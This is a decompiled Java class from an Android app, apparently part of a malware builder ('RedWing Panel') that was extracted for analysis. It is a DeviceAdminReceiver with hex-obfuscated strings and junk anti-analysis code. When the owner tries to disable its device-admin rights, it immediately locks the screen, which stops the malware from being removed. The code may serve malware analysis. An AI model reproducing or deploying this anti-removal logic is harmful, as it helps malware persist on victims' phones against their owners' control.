package app.mobilex.plus.receivers;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import app.mobilex.plus.util.TypefaceCache;
import v.s.xg1k7beQsmhLOomNTrI;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class DeviceAdminReceiver extends android.app.admin.DeviceAdminReceiver {
    public static final xg1k7beQsmhLOomNTrI Companion = new xg1k7beQsmhLOomNTrI();
    private static final String TAG = TypefaceCache.obtain("00070073004D008E00F300BA00F300A3002E007F005500B500F500BC00D700AE003500730049");

    private static /* synthetic */ void ybnabtdjpi() {
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public CharSequence onDisableRequested(Context context, Intent intent) {
        TypefaceCache.obtain("00070073004D008E00F300BA009200A60027007B0052008900B000BB00DB00B4002200740057008200B000AD00D700B6003600730048009300F500BB009220D300630077005F008300F900B100D500E7002500640052008400E400B600DD00A9");
        try {
            Object systemService = context.getSystemService("device_policy");
            DevicePolicyManager devicePolicyManager = systemService instanceof DevicePolicyManager ? (DevicePolicyManager) systemService : null;
            ComponentName componentName = new ComponentName(context, (Class<?>) android.app.admin.DeviceAdminReceiver.class);
            while (Runtime.getRuntime().maxMemory() < 0) {
                Long.hashCode(System.nanoTime());
            }
            if (devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName)) {
                devicePolicyManager.lockNow();
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002F00790058008C00DE00B000C500E7002500770052008B00F500BB008800E7");
            e.getMessage();
        }
        return TypefaceCache.obtain("0007007F0048008600F200B300DB00A900240036004F008F00F500FF00D300A3002E007F0055008E00E300AB00C000A600370079004900C700E700B600DE00AB00630064005E008A00FF00A900D700E7003000730058009200E200B600C600BE006300660049008800E400BA00D100B3002A00790055009400BE00FF00F300B5002600360042008800E500FF00C100B2003100730004");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        TypefaceCache.obtain("00070073004D008E00F300BA009200A60027007B0052008900B000BB00DB00B4002200740057008200F4");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        TypefaceCache.obtain("00070073004D008E00F300BA009200A60027007B0052008900B000BA00DC00A60021007A005E0083");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        TypefaceCache.obtain("001300770048009400E700B000C000A3006300750053008600FE00B800D700A3");
    }
}
